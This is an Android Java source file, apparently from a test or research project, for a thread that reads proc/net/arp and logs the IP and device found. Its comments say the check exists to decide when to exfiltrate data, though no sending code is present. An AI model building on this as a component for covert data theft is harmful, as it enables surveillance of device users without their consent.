package com.trustme.testsu;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;

public class IpCheck extends Thread{
	public static final String TAG = "IpCheck Thread";
	public static Handler handler;
	
	@Override
	public void run(){
		try{
			/* initialize the current Thread as a Looper */
			Looper.prepare();
			/* associates this handler with the queue of the current thread */
			handler = new Handler(){
				public void handleMessage(Message msg){
					
					/* Get the incoming values associated with this message */
						//we shouldn't get this bundle every time - access statically?
						Bundle b = msg.getData();
						if (b != null){
							//packageName = b.getString("packageName");
							//fileSuffix = b.getString("fileSuffix");
							//serviceBeginTime = b.getLong("serviceBeginTime");
							
						}
						read_arp();
					
				}
			};
			
			/* after the following line the thread will start running the message loop
		     * it will only stop due to an error or quit()
			 */
			Looper.loop();
			}
			catch(Throwable t){
				Log.e(TAG, "Looper stopped due to an error", t);
			}
	}
	
	/**
	 * This function reads proc/net/arp in search for an IP address
	 * @author sdemetr2
	 */
	protected void read_arp() {
		// read arp
		// if ip exists and new data available send intent to exfiltrate
		String fileName = "proc/net/arp";
		String arp_line;
		BufferedReader localBufferedReaderArp;
		FileReader localFileReaderArp;
		String[] arrayOfStrings;
		
		try {
			localFileReaderArp = new FileReader(fileName);
			localBufferedReaderArp = new BufferedReader(localFileReaderArp, 100); //8192 too big..be smarter
					
			arp_line = localBufferedReaderArp.readLine();
			arp_line = localBufferedReaderArp.readLine();
			if ((arp_line != null) && (arp_line.length() > 0) ){
				//we have internet!!
				arrayOfStrings = arp_line.split("\\s+");
				int i = 0;
				for (String item : arrayOfStrings){
					i++;
					if (i == 1){
						Log.i(TAG, "IP=" + item);
					}
					else if (i == 6){
						Log.i(TAG, "Device=" + item);
					}
				}
				
				//TODO: if we have updated data exfiltrate
			}
			else{
				//No internet
				Log.i(TAG, "NO INTERNET");
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			Log.i(TAG, "File not found: " + e);
		}
		
	}
}
